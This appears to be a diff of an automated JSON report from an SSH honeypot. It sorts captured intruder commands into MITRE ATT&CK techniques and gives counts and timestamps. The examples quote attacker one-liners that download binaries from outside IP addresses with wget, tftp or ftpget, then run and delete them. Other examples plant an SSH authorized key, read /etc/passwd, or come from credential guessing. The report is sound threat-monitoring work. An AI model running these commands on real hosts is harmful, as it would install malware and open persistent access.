@@ -1,278 +1,142 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-09 00:00:12",
+  "generated": "2026-09-09 01:00:20",
   "totals": {
-    "commands": 2167,
-    "login_failed": 5397,
-    "login_success": 619,
-    "sessions": 5961
+    "commands": 123,
+    "login_failed": 60,
+    "login_success": 31,
+    "sessions": 60
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 5397,
+      "count": 60,
       "examples": [
-        "root / test",
-        "root / abcd123456",
-        "root / Password!1234",
-        "lin / 123456",
-        "root / Qweasd123"
+        "admin / admin",
+        "root / root",
+        "enable / system",
+        "shell / sh",
+        "linuxshell / enablelinuxshell"
       ],
-      "first": "2026-09-08T00:00:00.445878Z",
-      "last": "2026-09-08T23:57:00.988936Z",
-      "unique_ips": 121
+      "first": "2026-09-09T00:03:10.052346Z",
+      "last": "2026-09-09T00:53:00.824940Z",
+      "unique_ips": 10
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 619,
+      "count": 31,
       "examples": [
-        "root / root123456",
-        "root / cxlinux",
-        "root / 147852369",
-        "ubuntu / ubuntu",
-        "admin / qwaszxpo"
+        "root / root",
+        "ubuntu / Oracle",
+        "enable\\x00 / linuxshell\\x00",
+        "ubuntu / ubuntu"
       ],
-      "first": "2026-09-08T00:53:18.216912Z",
-      "last": "2026-09-08T23:44:23.146275Z",
-      "unique_ips": 89
+      "first": "2026-09-09T00:03:10.740292Z",
+      "last": "2026-09-09T00:44:38.348388Z",
+      "unique_ips": 4
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 267,
+      "count": 15,
       "examples": [
-        "(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f",
-        "chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chatt",
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C\nuname=$(for c in unam",
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
-        ">/var/d && chmod 777 /var/d && /var/d && cd /var/"
+        ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
+        ">/var/tmp/d && chmod 777 /var/tmp/d && /var/tmp/d && cd /var/tmp/",
+        ">/var/run/d && chmod 777 /var/run/d && /var/run/d && cd /var/run/",
+        ">/dev/d && chmod 777 /dev/d && /dev/d && cd /dev/"
       ],
-      "first": "2026-09-08T00:00:01.899754Z",
-      "last": "2026-09-08T23:33:03.461029Z",
-      "unique_ips": 27
-    },
-    {
-      "id": "T1105",
-      "name": "Ingress Tool Transfer",
-      "tactic": "Command and Control",
-      "count": 122,
-      "examples": [
-        "(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f",
-        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
-        "http://185.93.89.72/wget",
-        "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
-        "cd /tmp||cd /var/run||cd /mnt||cd /root||cd /;(wget -q -O 1.sh http://198.144.179.82:80/1.sh||busybox wget -q -O 1.sh ht"
-      ],
-      "first": "2026-09-08T00:00:01.899754Z",
-      "last": "2026-09-08T23:33:03.461029Z",
-      "unique_ips": 22
+      "first": "2026-09-09T00:03:11.283737Z",
+      "last": "2026-09-09T00:03:48.179136Z",
+      "unique_ips": 1
     },
     {
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 28,
+      "count": 8,
       "examples": [
-        "whoami",
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C\nuname=$(for c in unam",
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
-        "id",
-        "sudo -n whoami 2>/dev/null"
+        "sudo -n whoami 2>/dev/null",
+        "sudo -S whoami 2>/dev/null"
       ],
-      "first": "2026-09-08T02:06:38.897655Z",
-      "last": "2026-09-08T23:33:02.557145Z",
-      "unique_ips": 22
+      "first": "2026-09-09T00:03:12.667622Z",
+      "last": "2026-09-09T00:08:08.694798Z",
+      "unique_ips": 2
+    },
+    {
+      "id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "tactic": "Command and Control",
+      "count": 4,
+      "examples": [
+        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
+        "http://185.93.89.72/wget",
+        "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
+        "(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f"
+      ],
+      "first": "2026-09-09T00:03:12.667622Z",
+      "last": "2026-09-09T00:03:48.179136Z",
+      "unique_ips": 1
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 27,
-      "examples": [
-        "uname -s -m",
-        "chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chatt",
-        "uname -a",
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C\nuname=$(for c in unam",
-        "uname -s -v -n -r -m"
-      ],
-      "first": "2026-09-08T00:53:38.068295Z",
-      "last": "2026-09-08T23:21:51.177481Z",
-      "unique_ips": 22
-    },
-    {
-      "id": "T1083",
-      "name": "File and Directory Discovery",
-      "tactic": "Discovery",
-      "count": 7,
-      "examples": [
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C\nuname=$(for c in unam",
-        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
-        "ls /"
-      ],
-      "first": "2026-09-08T02:17:18.249790Z",
-      "last": "2026-09-08T21:17:14.234967Z",
-      "unique_ips": 7
-    },
-    {
-      "id": "T1059.004",
-      "name": "Command and Scripting Interpreter: Unix Shell",
-      "tactic": "Execution",
-      "count": 6,
-      "examples": [
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C\nuname=$(for c in unam",
-        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
-      ],
-      "first": "2026-09-08T02:17:18.249790Z",
-      "last": "2026-09-08T21:17:14.234967Z",
-      "unique_ips": 6
-    },
-    {
-      "id": "T1070.004",
-      "name": "Indicator Removal: File Deletion",
-      "tactic": "Defense Evasion",
-      "count": 5,
-      "examples": [
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C\nuname=$(for c in unam"
-      ],
-      "first": "2026-09-08T02:17:18.249790Z",
-      "last": "2026-09-08T21:17:14.234967Z",
-      "unique_ips": 5
-    },
-    {
-      "id": "T1087.001",
-      "name": "Account Discovery: Local Account",
-      "tactic": "Discovery",
-      "count": 2,
-      "examples": [
-        "cat /etc/passwd"
-      ],
-      "first": "2026-09-08T17:00:55.777874Z",
-      "last": "2026-09-08T23:33:02.561984Z",
-      "unique_ips": 2
-    },
-    {
-      "id": "T1098.004",
-      "name": "Account Manipulation: SSH Authorized Keys",
-      "tactic": "Persistence",
-      "count": 2,
-      "examples": [
-        "chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chatt",
-        "mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHQGOxKK322AbGwPqefUy1MUBZ"
-      ],
-      "first": "2026-09-08T01:07:43.739933Z",
-      "last": "2026-09-08T08:37:10.903931Z",
-      "unique_ips": 2
-    },
-    {
-      "id": "T1037",
-      "name": "Boot or Logon Initialization Scripts",
-      "tactic": "Persistence",
       "count": 1,
       "examples": [
-        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
+        "uname -a"
       ],
-      "first": "2026-09-08T08:37:15.106412Z",
-      "last": "2026-09-08T08:37:15.106412Z",
-      "unique_ips": 1
-    },
-    {
-      "id": "T1489",
-      "name": "Service Stop",
-      "tactic": "Impact",
-      "count": 1,
-      "examples": [
-        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
-      ],
-      "first": "2026-09-08T08:37:15.106412Z",
-      "last": "2026-09-08T08:37:15.106412Z",
+      "first": "2026-09-09T00:39:03.052905Z",
+      "last": "2026-09-09T00:39:03.052905Z",
       "unique_ips": 1
     }
   ],
   "unmapped": [
     [
+      "system",
+      29
+    ],
+    [
       "shell",
-      525
+      29
     ],
     [
       "sh",
-      525
-    ],
-    [
-      "system",
-      518
-    ],
-    [
-      "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
-      92
-    ],
-    [
-      "enable",
-      22
+      29
     ],
     [
       "/bin/busybox",
-      22
+      7
     ],
     [
-      "zalee",
-      20
-    ],
-    [
-      "za",
-      20
-    ],
-    [
-      "&k`g&k|zpkfq)ES[M",
-      20
-    ],
-    [
-      "cd /proc && cat self/cmdline",
-      14
+      "enable",
+      1
     ],
     [
       "linuxshell",
-      13
+      1
     ],
     [
       "enablelinuxshell",
-      13
+      1
     ],
     [
       "ping ;sh",
-      13
-    ],
-    [
-      "root",
-      4
+      1
     ],
     [
       "busybox",
-      3
+      1
     ],
     [
-      "RPMA",
-      3
-    ],
-    [
-      "AMOO",
-      3
-    ],
-    [
-      "/bin/busybox TOKEN",
-      2
-    ],
-    [
-      "ping; sh",
-      2
-    ],
-    [
-      "/bin/busybox STC",
-      2
+      "cd /proc && cat self/cmdline",
+      1
     ]
   ]
 }
